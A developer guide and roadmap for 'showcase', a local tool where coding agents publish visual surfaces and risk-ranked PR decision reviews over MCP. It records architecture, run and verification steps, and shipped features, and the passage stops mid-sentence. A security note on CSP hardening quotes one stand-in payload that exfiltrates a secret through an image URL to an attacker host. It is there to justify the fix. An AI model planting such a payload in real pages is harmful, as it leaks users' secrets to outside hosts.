# showcase — project guide & roadmap

The single doc to read before working on showcase — especially in a background
session. Sections 1–5 are "how it works / how to work here" (stable reference);
section 6 is the roadmap (what to build); sections 7–8 are open decisions and
how to pick up work autonomously. Architecture detail lives in `AGENTS.md`.

**👉 The decision-review form factor is built, dogfooded, and complete — the
shipped summary is immediately below.** Sections 1–8 are the stable guide/roadmap
underneath it.

---

## ⭐ Active focus — decision-review form factor

An agent decomposes a PR into a small, risk-ranked queue of **decisions** (a
plain-English Brief + per-decision confidence + evidence + a complete changed-file
manifest), published via `publish_decisions` / `POST /api/sessions/:id/review`,
rendered inline in the board for a `kind === "review"` session. North-star design:
`docs/review-form-factor.md`.

**✅ The two-API fork is resolved.** The old finding-card review model
(`publish_review` / `review_finding` MCP tools, `showcase review` / `showcase
finding` CLI, the verdict card + finding cards + risk treemap + confidence×coverage
quadrant + `changeMap`) has been **removed**. `publish_decisions` is now the single
review path, registered on **both** the HTTP and stdio MCP transports (manifest
included), with `showcase decisions <session> <file>` as the CLI. The static export
inlines the stored review so a shared review renders offline.

This is a **dogfood-driven redesign** — built it, reviewed a real Java PR through
it (`wealthfront-lembas` `cl/ALLM-126`), and the shipped list below is the feedback
that surfaced. Get the human's intent right; this is UX, not just plumbing.

### Shipped — do NOT redo, build on it

The form factor is built and was dogfooded against a real Java PR
(`wealthfront-lembas` `cl/ALLM-126`):

- **Inline board rendering** — a `kind === "review"` session takes over the main
  panel via `ReviewInline` → `ReviewView`; sidebar rows chip their verdict and open
  the review inline.
- **The live loop** — `publish_decisions` MCP tool (HTTP + stdio, manifest on
  both), `review-updated` SSE event, `ReviewView` / `ReviewInline` / `ReviewPage`.
  `coerceReview` does server-side newline normalization + the brief-format warning.
- **Complete changed-file manifest** (Phase 1) — `ReviewView`'s collapsible "All N
  files changed" panel (`Manifest`, fed by `Review.manifest` / `ManifestFile`) tags
  every file `has-decision` / `reviewed · no comment` / `mechanical · skipped` with
  line counts, linking to its decision. Addresses the "trusting the skip set" distrust.
- **Decision IDs + adjudication** (Phase 2) — "Verify" verb dropped; each decision
  carries a stable copy-ref (`CopyRef`) you paste into normal agent chat to scope a
  revision; a lightweight local **Accept** drives the burndown; content-keyed so it
  survives an agent re-publish.
- **Honest ledger** (Phase 3) — the "High confidence / Checked / Not yet" labels are
  gone; one signal, "How sure", in plain words (Confident / Fairly sure / Not sure).
  Unbacked self-reported "what I verified" claims were dropped.
- **Suggested fixes** (Phase 4) — `EvidencePane` renders `Decision.proposal` as a
  labeled before→after "Suggested fix" diff beneath the evidence.
- (Also fixed the `code-review` skill to scope depth per-slice so reviews stop
  fanning out 5 specialists over the whole diff — `~/Sites/ai-config`.)

- **Single in-browser verb: Accept** — the Disagree button (and its composer,
  `D` key, structured `disagreeText` comment, and per-decision comment trail) was
  dropped. Pushback is now the copy-ref + normal-chat flow: copy a decision's
  stable ref and paste it into agent chat to scope a revision; the agent
  re-publishes and the decision updates in place. The burndown is accepted-only.

### Key files

- `server/types.ts` — `Review` / `Decision` / `DecisionProposal` / `ManifestFile`
  (stable decision `id`s and the `manifest` field) + `Store`.
- `server/app.ts` — `coerceReview()` validation, `publishDecisions` flow,
  `/api/sessions/:id/review` routes, `/api/sessions` row decoration
  (`kind`, `reviewVerdict`).
- `server/mcpSpec.ts` — `publish_decisions` schema + field docs (update for new
  fields).
- `viewer/src/review/ReviewView.tsx` — the renderer (Brief, decision queue,
  ledger, sticky evidence). `ReviewInline.tsx` embeds it in the board;
  `ReviewPage.tsx` is the standalone `?review=` page.
- `guide/PLAYBOOK.md` — the "decision review" recipe the agent follows (teach it
  the manifest, decision IDs, and when to include a `proposal`).

### Run & verify

- Pinned Node: `export PATH="$HOME/.nvm/versions/node/v24.12.0/bin:$PATH"`.
  Port **8229**. `pnpm dev` builds the viewer + restarts the server on save.
- Gate before "done": `pnpm typecheck`, `pnpm test`, `pnpm lint` (warnings =
  errors), `pnpm format:check`. For UI, screenshot with a headless Playwright
  script and actually look — `http://localhost:8229/session/<reviewSessionId>`.

### Cautions

- **Parallel editing is happening** — the board is being refactored (`App.tsx`,
  `api.ts`, `state.ts`, `Card.tsx`, session `kind` work) in another editor. Don't
  clobber in-flight work; prefer `ReviewView.tsx` + server validation; confirm
  before big `App.tsx` edits.
- **Never `git commit` / `gh pr create` directly** (hooks block them); the human
  commits. Don't push. Keep changes small and typechecking at each step.

---

## 1. What it is

A live visual surface for AI: an agent publishes **surfaces** (cards built from
typed parts — html, markdown, mermaid, diff, terminal, image, json, code, trace)
and they render in a browser you watch and comment on. The agent lives in your
editor (Cursor / Claude Code) and reaches _out_ to showcase over MCP.

**The product is two flagship workflows** (section 6), not a pile of features:

1. **Visual PR review** (flagship) — _"the future of code review is multimodal."_
   An agent reviews a diff and publishes a **decision queue** (`publish_decisions`):
   a plain-English Brief anyone can read, a risk-ranked list of **decisions** each
   with its evidence (a diff, a control-flow **mermaid**, a suggested-fix diff), and
   a complete changed-file manifest. You Accept each decision, or copy its ref into
   chat to ask for a revision; it revises in place; the review carries a shareable
   verdict. No GitHub thread renders like that.
2. **Learning & explainers** — share a screenshot/snippet with your agent and get
   back an **animated, interactive** explainer you can scrub and ask questions of.

Everything else in the roadmap is _supporting capability_ in service of those two.

**Stack:** runtime-agnostic Hono server (`server/`) + a React 19 / zustand /
Tailwind v4 / shadcn viewer (`viewer/`, Vite → one self-contained
`index.html`) + a stdio/HTTP MCP server (`mcp/`) + a zero-dep CLI (`bin/`).
Local JSON-file store. `server/themes.ts` is the single color source for both
the chrome and the sandboxed part-iframes.

---

## 2. Operating guide

**Run it** (needs Node ≥ 22.18 — the nvm default here is v20, too old; use v24):

```sh
cd ~/personal/showcase
pnpm install             # once after cloning (pnpm workspace)
pnpm serve               # API + viewer on http://localhost:8229  (keep running)
# rebuild the viewer + restart after viewer changes:
pnpm build:viewer
node packages/cli/bin/showcase.js demo   # seed example sessions to look around
```

**Create a surface** — in Cursor/Claude Code, ask "diagram X on showcase" /
"sketch this on showcase"; the agent calls `publish_surface` and a card appears.
Or directly: `node packages/cli/bin/showcase.js mermaid flow.mmd --title "Flow"` (also
`publish`, `diff`, `markdown`, `code`, `image`, …).

**Iterate** — the agent calls `update_surface {id, parts}` → _same card, new
version_ (the `v2 ⌄` Select flips versions). You comment under any card → it
reaches the agent (section 4).

**Both editors are wired** to the same `showcase` MCP server (stdio, proxies the
local API), pinned to the v24 node binary:

- Claude Code — user scope in `~/.claude.json`, `SHOWCASE_AGENT=claude-code`.
- Cursor — global `~/.cursor/mcp.json`, `SHOWCASE_AGENT=cursor`.
  Only requirement: keep `pnpm serve` running, then talk to either agent.
  Restart the editor after MCP config changes.

---

## 3. Architecture map

> **Workspace note:** the code is now a pnpm workspace — the files below moved
> into `packages/{core,server,mcp,cli,viewer}/` (the runtime-agnostic half —
> `types`, `surfacePage`, `themes`, `kits`, `blueprints`, `events`, `mcpSpec`,
> `export` — is `@showcase/core`; `app`/`storage`/`mcpHttp`/`index` are
> `@showcase/server`). Paths below are written in the pre-split form for brevity;
> `AGENTS.md` has the canonical package map.

- `server/app.ts` — Hono app (runtime-agnostic): routes, SSE `/api/events`,
  long-poll `/api/comments`, the `/s/:id` sandboxed renderer, and the shared
  flow functions REST + MCP both call.
- `server/types.ts` — data model + `Store` interface. `server/storage.ts` —
  `JsonFileStore` (the only store; the Cloudflare SqlStore was removed).
- `server/surfacePage.ts` / `themes.ts` / `kits.ts` — sandboxed rendering, the
  theme registry (single color source), and opt-in html-part style bundles.
- `viewer/` — React 19 + zustand store (`state.ts`) + Tailwind v4 + shadcn
  (`components/ui/`). `index.css` bridges shadcn/Tailwind tokens to the theme
  vars; `styles.css` is just the `:root` design tokens now.
- `mcp/server.ts` — stdio MCP (thin client over the HTTP API).
  `server/mcpHttp.ts` — streamable HTTP MCP at `/mcp`.
- **Core invariant:** agent-authored HTML renders ONLY inside sandboxed,
  opaque-origin iframes — never `innerHTML`/`dangerouslySetInnerHTML` in the
  trusted viewer origin. Two safe paths: build a string → sandbox iframe
  (`SandboxedPart`, `renderHtmlPage`), or keep it data → render with React text
  nodes (image/trace). When adding a part kind, pick one.

---

## 4. The agent feedback loop (contract)

**The server never pushes to your editor — the agent pulls.** A comment you type
is `POST /api/comments` with `author=user`, stored on the surface → its session.
The agent receives it when it next touches showcase:

1. **Piggyback** — its next publish/update response carries `userFeedback[]`.
2. **Blocking wait** — `wait_for_feedback` long-polls its session for
   `author=user` comments.
3. Background watch (CLI).
   Per-session, exactly-once (an `agentSeq` cursor). **Gotcha:** after a turn the
   agent isn't listening — the reliable pattern is _comment → tell the agent to
   check_. Reducing this friction is a roadmap item (Pillar C). Surface URLs handed
   to humans are the viewer deep link (`/session/:sid/s/:id`), not `/s/:id`.

---

## 5. How to work in this repo (read before any change)

- **Branch gate.** Don't commit redesign/feature work on `main`. Branch first;
  merge (fast-forward) when a chunk is green and reviewed.
- **The oracle is the merge gate.** `e2e/loop.spec.ts` (Playwright) drives a real
  browser through publish → render → comment. Run `npx playwright test`. It
  asserts only on trusted-origin DOM hooks (`.card[data-id]`, per-part
  `<iframe>`s, and `.thread .cmt.user` carrying the comment text) so it survives
  a restyle but catches a broken change. **Keep these hooks intact.** (Gap: desktop-chromium
  only — see Pillar F.)
- **Verify before reporting done** (all must pass): `pnpm typecheck`
  (root test program + `pnpm -r typecheck`), `pnpm lint` (oxlint + core no-`node:`
  boundary, warnings = errors), `pnpm build:viewer`, `npx playwright test`. For UI,
  screenshot via a headless Playwright script and look at it. `pnpm format` last.
- **Node:** prefix shells with a pinned v24 on PATH, e.g.
  `export PATH="$HOME/.nvm/versions/node/v24.14.1/bin:/usr/bin:/bin:/usr/local/bin"`.
  This shell aliases `cat`→a missing tool (use Read/`sed`) and lacks `lsof`
  (kill servers via `ps ax | grep server/index.ts | awk | xargs kill`).
- **Styling:** Tailwind utilities + shadcn on the JSX — do NOT add rules to
  `styles.css`. New palette needs go through the `index.css` `@theme` bridge.
- **Commits:** Conventional Commits; end with the Co-Authored-By line. One
  logical change per commit; verify before each.
- **LLM code:** anything calling Claude must use `@anthropic-ai/sdk`, model
  `claude-opus-4-8`, `thinking:{type:"adaptive"}`, and streaming. Consult the
  `claude-api` skill before writing it. Never hardcode keys — read
  `ANTHROPIC_API_KEY` from env.

---

## 6. Roadmap

Three parts: **what's shipped** (don't redo), **what's retired/cut** (don't
rebuild), and **what's actually left**. The roadmap is organized by **workflow**,
not by capability — the two flagship workflows (§1) set priority.

**Why workflows, not features:** the rendering primitives for a great review card
were never the hard part — the multimodal card in the product screenshot is just a
`[prose, mermaid, diff]` surface, and the diff renderer already does file
headers, line numbers, syntax highlighting, and unchanged-line folding. The work
was the _workflow_ that makes an agent produce those cards by default, plus the
review-level structure (severity, verdict, share-back) that turns a pile of cards
into a review — that's Workflow 1, now shipped (R1–R4).

### ✅ Shipped foundation — don't redo, build on it

The viewer redesign, the design-polish backlog, and both flagship workflows are
complete. The stable base everything below assumes:

- **Redesign** — viewer ported Solid → React 19 + zustand + Tailwind v4 + shadcn;
  styling fully on Tailwind utilities (no `styles.css` rules); one self-contained
  `index.html`.
- **Slimmed** — stream-only (no Stream/Timeline toggle), no server-side trace
  pipeline, no Cloudflare SqlStore, no multi-theme engine — one fixed GitHub
  light/dark theme with `server/themes.ts` as the single color source.
- **claude.ai-grade chrome (Pillar F1–F17)** — shadcn `Sidebar`, per-session
  overflow menu (rename / delete / copy-link), live search, app header, surface-card
  chrome, skeletons + empty states, lucide icon set, motion pass, Sonner toasts,
  one type/spacing scale, dark mode.
- **Primitives** — `chart` part (Recharts, themed SVG, `showcase chart`, in the MCP
  schema); markdown **math** (`$…$`/`$$…$$` via KaTeX → MathML); the **kit gallery**
  (`issues` / `slides` copy-paste markup); **structured feedback** (one-tap Approve
  👍 / Dismiss ⊘ posting an `author:"user"` signal); a **hardened oracle**
  (`render-smoke.spec.ts` + an opt-in real-Chrome Playwright lane).
- **Workflow 1 — Visual PR review (R1–R4)** — finding-card `badge` (tone+label) +
  the recipe + demo; a live verdict bar derived from badges (burns down on
  Approve/Dismiss); `showcase review <branch>` ingestion (churn-seeded manifest +
  risk scaffold, delegates analysis to the `code-review` skill).
- **Workflow 2 — Learning & explainers (L1–L3)** — the opt-in `animate` kit
  (`server/kits.ts`: cumulative `.step` reveal + scrub bar, reduced-motion aware),
  the screenshot→explainer recipe + demo, and `ReadingView` (one-explainer focus
  mode).
- **Static export** — `showcase export <session>` → one self-contained read-only
  `.html` (surfaces + comments + assets inlined as `data:` URIs); `--pdf` renders it
  through headless system Chrome with a flattened, paginating layout.

### Retired / cut — don't rebuild (commit `03c2693` unless noted)

- **Chat thread** — the per-surface comment thread + composer (`Thread.tsx`). Surface
  feedback is now Approve/Dismiss + decision threads + "copy the card id, mention it
  in your terminal."
- **Anchored annotations + line-anchored diff comments (R4)** — point-pin, line-click
  composer, and the whole `CommentAnchor` / `parseAnchor` / `onLineClick` machinery;
  all removed from the tree.
- **Drill-down chip** — the "Suggested by this surface" chip + "Send to agent" button.
  (The `sendPrompt()` html-part bridge survives and works — it posts an
  `author:"surface"` comment — but has no dedicated viewer affordance.)
- **Editor-agent chat (was Pillar B)** — never shipped; no in-browser chat, no
  `showcase chat`, no presence dots. Only the `listening` green dot survives. The
  real loop is the comment / `wait_for_feedback` pull (§4).
- **Pinned Library** — cut by the daily-use razor; pin/Library wiring removed
  end-to-end.
- **GitHub round-trip** (`gh pr review` line comments) — dropped on purpose;
  showcase is its own surface, not a GitHub front-end. Sharing = static export.

---

### 🔨 What's actually left

Everything in §1's two flagship workflows is shipped. Two things remain, neither
load-bearing:

1. **Review-depth visuals** — the opt-in per-PR chart track below.
2. **In-file moved-code detection** + an optional **Tour surface** — both below.

#### Review depth — fancier review visualizations (a track to develop)

The base review (R1–R4) ships with the opinionated overview, risk treemap,
confidence×coverage quadrant, edge-status change map, live burndown, and keyboard
traversal. These are the next depth investments to make the review _best-in-class_
— worth working through deliberately, one at a time, opt-in per PR so the overview
never clutters. Getting each one to feel right matters more than shipping fast.

**Substrate decision (post-security-audit):** build these on the existing
**Recharts `chart` part** — trusted React → SVG from structured data, the
audited-safe path — plus small hand-rolled trusted-SVG parts for the few shapes
Recharts lacks (matrix, arc, minimap). **No sandboxed D3 kit**: Recharts is
already in the app, D3 would add ~250KB + a brand-new sandboxed-iframe attack
surface for zero benefit, and treemap/scatter were already added this way.

- **Opt-in depth visuals** — each extends the trusted chart path:
  - **churn×complexity hotspot bubble** — Recharts scatter + a size (Z) axis.
  - **coupling-delta bar** — Recharts stacked bar (already possible).
  - **file minimap / heat-strip** — small custom-SVG React part.
  - **adjacency / co-change matrix** — custom-SVG rect grid.
  - **layered arc diagram** — custom-SVG `<path>` arcs.
  - **overview blast radius** — mermaid (already have).
    Swap in per PR (a big refactor wants the matrix; a one-file fix wants the
    minimap) — never all at once.
- **In-file moved-code detection** — `@pierre/diffs` detects file-level renames but
  not in-file block moves; label "moved, unchanged" instead of delete+add. Spike
  the renderer first. _Effort:_ unknown (renderer-gated).
- **Tour surface** — an optional `slides` / `animate` walkthrough for a complex
  PR's narrative ("added the column → backfilled → flipped the read path").
  Deferred polish; the overview is the win. _Effort:_ ~2–3h.

_Explicitly **not** doing:_ large-diff row virtualization — the per-file SSR diff
render is adequate; revisit only if one huge file's hunk count bites. Also dropped:
a GitHub round-trip (`gh pr review` line comments) — showcase is its own surface,
not a GitHub front-end; sharing is the static export.

_(Workflow 2 — learning & explainers — and static export are both shipped; see the
shipped-foundation list above.)_

#### Platform, durability & trust — a new track (June 2026)

A set of directions surfaced in a codebase review that harden the engine and
deepen Workflow 2. Each is independent and opt-in to pick up; grouped by theme.

**Editor-side conversation ergonomics**

- **✅ Shipped — tighten the editor↔surface reference loop.** The conversation
  deliberately lives in Cursor / Claude Code, not in showcase (the in-app comment
  UI was stripped on purpose); the copy-ref affordance is the bridge, now scoped.
  (a) **Scoped copy-refs** — `CardIdChip` (`viewer/src/Card.tsx`) copies a
  paste-ready phrase `showcase surface <id> "<title>"` instead of a bare id, so a
  paste into your terminal carries exact scope. (b) **Agent read-back** — a new
  **`get_surface`** MCP tool (both transports) returns a surface's CURRENT full
  content, so when a ref lands the agent reads what's on it and `update_surface`s it
  in place; the old `MCP_INSTRUCTIONS` claim that `list_surfaces` returned content
  is fixed (it's the title index; `get_surface` is the content). The explainer
  stays a plain document; the conversation stays in the editor. _Next refinement
  (optional): per-step copy buttons inside the `animate` kit for step-level scope._

**Housekeeping**

- **✅ Shipped — Asset lifecycle / GC.** Eager upload eviction only fires under
  budget pressure, so orphaned assets (referenced by no live or historical
  surface) used to sit resident until then. Now `Store.gcAssets()` (a lazy sweep
  reusing `referencedAssetIds`) + `Store.boardStats()` back two routes —
  `POST /api/board/gc` and `GET /api/board` — surfaced as **`showcase gc`**
  (`--dry-run` previews, `--json` for scripting) and **`showcase board`** (the
  one-line size tally: sessions · surfaces · comments · reviews · assets
  (bytes / budget) · orphaned). Covered by store-contract, API, and CLI tests.

**Quality & trust**

- **Accessibility pass** — for a product whose premise is _visual_ surfaces in
  sandboxed iframes, there's no a11y story: iframe titles, focus order across
  cards, contrast on the tone chips, screen-reader labels on the decision queue. A
  deliberate WCAG pass is table stakes. _Effort: medium._
- **✅ Shipped — Operational observability.** The CLI installs showcase as a
  launchd/systemd service but had no liveness signal. Now an owner-scoped
  **`GET /api/health`** reports `{ status, uptimeMs, version, board, lastError }`
  — liveness plus the board tally plus the last unhandled error (message + when;
  `app.onError` records it, `status` flips `ok`→`degraded`), surfaced as
  **`showcase health`** (human one-liner + `--json`). **Structured request
  logging** is an opt-in middleware (one JSON line per `/api`/`/mcp` request —
  method · path · status · ms; `/api/health` excluded so a polling monitor
  doesn't flood it), wired from `SHOWCASE_LOG=1` in `index.ts` and off by default
  so the local board stays quiet. Covered by API + CLI tests. _Remaining (cut for
  now): a self-rendered "board status" surface — `showcase health` covers the
  need; revisit only if an in-board monitoring card is wanted. Update-check
  failures staying silent is intentional (this fork has no published release)._
- **✅ Shipped — Tightened the html-part CSP + wrote the threat model.** `img-src`
  / `media-src` dropped the wildcard **`https:`** scheme (both `buildCsp` and
  `buildRichCsp` in `surfacePage.ts`): a bare `https:` source is a URL-borne
  exfil channel even with scripts boxed and `connect-src` closed
  (`<img src="https://attacker/?b=<secret>">`), so images/media are now `data:` /
  `blob:` / this board's `origin` only — no external host appears anywhere in the
  policy. Backed by `test/surfacePage.test.ts` regression assertions (no wildcard
  scheme in img/media). The full trust model — invariant, sandbox attribute, CSP,
  the host bridge, auth, CSRF guard, residual risks — is now **`docs/SECURITY.md`**
  (linked from `AGENTS.md`), which also records the maintenance rule: run the
  `security-review` skill over any diff touching the sandbox/CSP/bridge/auth.

**Extensibility ergonomics**

- **✅ Shipped — Schema validation + `showcase validate`.** `userConfig.ts` used
  to validate only rough shape, so a malformed palette color or misspelled slot
  was skipped (or rendered as a silent empty CSS var) with no author-facing
  error. Now `@showcase/core/configSchema.ts` holds **zod schemas** for all four
  config kinds (theme / kit / blueprint / config.json) — one source of truth used
  in two places: boot loading (`userConfig.ts` warns each `path: message` issue
  and skips) and `POST /api/config/validate`, surfaced as **`showcase validate`**
  (`--json` for CI; non-zero exit on any invalid file). It reads the same
  user (`~/.showcase`) + repo (`<cwd>/.showcase`) dirs the server loads, posts
  each file's content, and reports per-file ✓/✗ with located errors. The CSS-color
  refinement accepts hex / functional notations / `var()` / named colors and
  rejects garbage; palette + accent objects are `.strict()` so a typo'd slot is
  flagged. _Note: this tightened boot validation — a partial-palette theme that
  previously loaded with gaps is now skipped with a clear warning._ Covered by
  core-schema, API, and CLI tests.
- **✅ Shipped — expose board state to the agent via MCP resources/prompts.** Both
  transports now advertise `resources` + `prompts` capabilities. Surfaces are
  browsable/attachable as `showcase://surface/<id>` resources (`resources/list` +
  `resources/read` on HTTP; a `ResourceTemplate` on stdio, scoped to the session),
  and the flagship recipes ship as **prompts** (`review_pr`, `explainer`) with text
  shared by both transports (`promptMessages` in `server/mcpSpec.ts`). Covered by
  `test/api.test.ts` ("mcp read-back"). _Next: surface the assets/sessions as
  resources too if a need shows up._

**Developer experience & architecture**

- **🏗️ Platform split — pnpm monorepo + best-in-class CLI / MCP / viewer.** This is
  a dedicated track of its own; the two stubs that used to live here ("robust CLI",
  "pnpm monorepo") are folded into it. The full plan — target package layout, the
  per-surface designs, the migration sequencing, and the open decisions — lives in
  **[§6.A below](#6a--platform-split-track-pnpm-monorepo--best-in-class-cli--mcp--viewer)**.
  **✅ Move 0 (the workspace split) is shipped** — five `@showcase/*` packages,
  green on all gates, behavior-preserving. Moves 1–3 (per-surface reworks) inherited
  their structural wins from it and are now additive-quality follow-ups; see §6.A.
  _Effort: large; the split is done — the three surface reworks remain._

#### 6.A — Platform-split track: pnpm monorepo + best-in-class CLI / MCP / viewer

> **One track, four moves.** Today everything — the zero-dep CLI (`bin/`), the
> runtime-agnostic Hono server + Node wiring (`server/`), the stdio MCP (`mcp/`),
> and the Vite viewer (`viewer/`) — lives in **one root `package.json`** with one
> dependency tree, and the viewer build is coupled to the server (the server reads
> `viewer/dist/index.html` at boot). The goal is to (0) split that into a **pnpm
> workspace** so each surface owns its deps/build/test behind an enforced boundary,
> then make each of the three external surfaces — (1) **CLI**, (2) **MCP**, (3)
> **viewer** — best-in-class on its own. **Do move 0 first**; it's the substrate the
> other three sit on, and it touches every import path, `tsconfig`, and dev/build
> script. Sequence and open decisions are at the end.
>
> **Reference implementation:** the **curly** repo (`~/curly`, the user's HTTP CLI)
> is the template for the CLI shape — `src/commands/<name>/index.ts` per command,
> `src/core/*` for domain logic, `src/lib/cli/{parser,help,validation}.ts`,
> `src/lib/output/*`, `src/lib/utils/*`, an Ink/React TUI under
> `commands/load-test/tui/`, and a separate `website/` (Next.js). Curly is a single
> package, not a monorepo — borrow its **command layout**, not its packaging.

##### Move 0 — pnpm workspace split ✅ SHIPPED

**Done.** The repo is a pnpm workspace of five `@showcase/*` packages — exactly
the layout below. Cross-package imports use package names (per-package `exports`
map `./*: ./*.ts`), which Node type-strips across the workspace symlink with no
build step. Open decisions were resolved with the user: **pnpm** (not npm
workspaces), **plain root scripts** (no turbo). The viewer-artifact question is
answered by a `@showcase/viewer` `server-entry` that resolves its own built
`dist/index.html`, so the server reads it without hard-coding the layout. The
runtime-agnostic boundary is CI-enforced (`scripts/check-core-boundary.mjs` fails
the lint gate on any `node:` import in core). All gates green; the e2e oracle is
identical to the pre-split baseline (behavior-preserving). The shipped layout:

```
showcase/
  pnpm-workspace.yaml          # packages: ['packages/*']
  package.json                 # root: workspace orchestration only, shared devDeps
  tsconfig.base.json           # shared compiler options; per-pkg tsconfig extends it
  packages/
    core/      @showcase/core    — runtime-agnostic, NO node: imports. The data model
                                   + the string-builder renderers + the MCP spec:
                                   types.ts, events.ts, surfaceParts.ts, surfacePage.ts,
                                   themes.ts, themeDerive.ts, theme-tokens.ts, kits.ts,
                                   blueprints.ts, base64.ts, mcpSpec.ts. Pure ESM,
                                   type-stripping-friendly. The runtime-agnostic
                                   invariant becomes a *package constraint* here.
    server/    @showcase/server  — Node HTTP runtime. Hono app.ts (routes, SSE,
                                   /s/:id), mcpHttp.ts (streamable-HTTP MCP at /mcp),
                                   storage.ts (JsonFileStore), index.ts (Node wiring),
                                   export.ts, userConfig.ts, presetRenders.ts,
                                   public.ts. → depends on @showcase/core.
    mcp/       @showcase/mcp     — stdio MCP (mcp/server.ts): a thin client over the
                                   HTTP API that imports the shared schema from core.
                                   → depends on @showcase/core.
    cli/       @showcase/cli     — the publishable `showcase` bin (the reworked
                                   bin/showcase.js). Talks to the server over HTTP;
                                   imports *types only* from core. Must NOT pull the
                                   viewer's React/Vite tree.
    viewer/    @showcase/viewer  — the Vite app → one self-contained dist/index.html.
                                   Imports surface/part *types* from core so the wire
                                   contract is enforced at the type level.
```

Dependency arrows: `core` ← everything; `server` ← (cli at runtime via HTTP, not an
import); `viewer` build output ← consumed by `server` at boot. **The boundary is the
point:** `@showcase/core` and the runtime-agnostic half of `@showcase/server` get a
package that forbids `node:` imports, turning today's convention into something CI
can enforce (an `oxlint`/dependency-cruiser rule per package).

Things that must survive the split:

- **No-build-step type stripping** for `core` / `server` / `mcp` / `cli` — keep
  erasable-syntax-only TS, `.ts` extensions in relative imports, run on Node ≥22.18.
  The viewer stays the one Vite-built exception.
- **The single self-contained `viewer/dist/index.html`** artifact, and the server
  reading it at boot. In a workspace the server resolves it from
  `@showcase/viewer`'s build output (a resolved package path) rather than a sibling
  `../viewer/dist`. Decide: read from `node_modules/@showcase/viewer/dist` vs. a
  small `@showcase/viewer` entry that exports the html string/path.
- **`npm run dev`** ergonomics (build viewer → watch both halves → restart on save →
  clean shutdown). Re-express as a root pnpm script that orchestrates the per-package
  dev tasks; evaluate `turbo`/`pnpm -r --parallel` for task graph + caching, but
  don't let it become a hard dep if a few root scripts suffice.
- **Validation gates** (`typecheck` / `test` / `lint` / `format:check`) run per
  package _and_ aggregated at the root; the Playwright oracle (`e2e/`) stays at the
  root since it drives the whole system end-to-end.
- The **guide/**, **skills/**, **docs/**, and **e2e/** trees stay repo-level (they
  describe the product, not one package).

##### Move 1 — best-in-class CLI (`packages/cli`)

**✅ Shipped — the command-layout rework landed and the package move is done**
(`packages/cli`, relocated as part of Move 0). The old single ~1400-line
`bin/showcase.js` was reworked into a real CLI modeled on curly. It is strictly
zero-dep and imports nothing from other packages (talks to the server over HTTP),
so the package boundary holds without effort. _Optional polish remaining: add
color/tables to the human output._ The shipped shape:

- **Command router** ✅ — `bin/showcase.js` is now a thin launcher into
  `cli/main.ts`; a **command registry** (`cli/registry.ts`) holds one `Command`
  per subcommand under `cli/commands/*` (grouped modules rather than curly's
  one-folder-per-command, since most are small), each owning its own `--help`
  generated from its option spec. (Layout note: `cli/commands/<group>.ts`, not
  `src/commands/<name>/index.ts`.)
- **Shared infra** ✅ — `cli/http.ts` (one HTTP client + **one place** mapping an
  API failure / unreachable server → exit code + human message, local auto-start
  preserved), `cli/command.ts` (typed/validated option parsing + per-command
  help), `cli/output.ts` (human by default + `--json` for scripting),
  `cli/errors.ts` (the `fail`/exit path + Levenshtein "did you mean").
- **Best-in-class affordances** ✅ — per-command help, `--json` everywhere for
  scripting, **shell completions** (`showcase completions <bash|zsh|install>`,
  generated from the live registry), consistent exit codes, clear actionable
  errors (did-you-mean for both mistyped flags and commands), and
  **command-level tests** (`test/cli.test.ts`).
- **Kept the loop the priority** and the **install story zero-friction** ✅ — the
  rework stayed **strictly zero-dep** (node built-ins only) and type-stripped like
  the server; no arg-parser/framework added. Note: the publish-family `--json`
  _part_ flag was renamed `--json-part` to free the global `--json`.
- **Package move** ✅ — `cli/` now lives in `packages/cli` (zero-dep, no viewer
  tree). _Optional polish remaining: color/tables in the human output._

##### Move 2 — best-in-class MCP (`packages/mcp` + the server's HTTP transport)

The MCP already has two transports (stdio in `mcp/`, streamable-HTTP at `/mcp`) and
already advertises **resources** (`showcase://surface/<id>`) and **prompts**
(`review_pr`, `explainer`). Best-in-class means tightening, not rebuilding:

- **One schema, two transports** ✅ — `mcpSpec.ts` now lives in `@showcase/core`
  as the single source of truth for tool schemas + field docs + prompt text; both
  the stdio server (`packages/mcp`) and `mcpHttp.ts` import it from there.
- **Typed + validated** — every tool input/output backed by a `zod` schema with
  structured, actionable error responses (not stringly-typed failures). _(Remaining.)_
- **Round-trip completeness** — `get_surface` (content read-back) is shipped; extend
  resources to **sessions** and **assets**, and confirm `update_surface` in-place
  revision stays the iterate path. Keep tool descriptions excellent — the agent's
  behavior is downstream of them.
- **Per-tool tests** on both transports (extend `test/api.test.ts`'s "mcp read-back"
  to cover each tool + resource + prompt), so the spec can't drift from either
  transport.
- Consider, only if a need shows up: **elicitation/sampling** for the comment→agent
  loop, and an MCP-level health/capability probe.

##### Move 3 — best-in-class viewer (`packages/viewer`)

Already React 19 + zustand + Tailwind v4 + vendored shadcn, Vite → one self-contained
`index.html`. Best-in-class here is about isolation, contract, and quality:

- **Isolated dep tree** ✅ — the React/Vite/shadcn stack lives only in
  `@showcase/viewer`; the CLI and stdio MCP carry none of it.
- **Typed wire contract** ✅ — the viewer imports surface/part types from
  `@showcase/core` (no re-declaration), so a server-side model change breaks the
  viewer build.
- **Keep the single-file artifact** — it's a feature (the server serves one file); do
  _not_ code-split. Note the tension with bundle growth and revisit only if it bites.
- **Component/unit tests** — add `vitest` + Testing Library for the part renderers
  (`*Part.tsx`) and the review views; the Playwright oracle stays the integration
  gate but per-component tests are missing today.
- Folds in two existing roadmap items as viewer-package work: the **accessibility
  pass** (iframe titles, focus order, contrast, SR labels on the decision queue) and
  a **part gallery / Storybook-like** harness for the renderers.

##### Sequencing & open decisions

**Order:** (0) workspace split ✅ — landed boringly, behavior-preserving, green on
`typecheck`/`test`/`lint`/oracle. **Then** (1) CLI, (2) MCP, (3) viewer
independently, each its own series of small commits.

**Open decisions — all resolved when Move 0 landed:**

- **`pnpm` migration** ✅ DECIDED — pnpm workspace (not npm workspaces);
  `package-lock.json` is gone, `pnpm-lock.yaml` is the lockfile, and the
  `npm run …` muscle-memory maps 1:1 to `pnpm …`.
- **`turbo` (or not)** ✅ DECIDED — not yet. Plain root scripts + `pnpm -r`; revisit
  only if the per-package task graph genuinely hurts.
- **CLI zero-dep stance** ✅ DECIDED — kept strictly zero-dep.
- **Viewer-artifact resolution** ✅ DECIDED — a `@showcase/viewer` `server-entry`
  resolves its own built `dist/index.html`; the server imports the path, staying
  ignorant of the workspace layout (chosen over a hard-coded `node_modules` path).

_Effort: Move 0 done. Moves 1–3 are independent additive-quality follow-ups that can
land in any order — much of their structural intent already came for free with the
split (CLI isolated & zero-dep, viewer dep tree isolated + typed wire contract, one
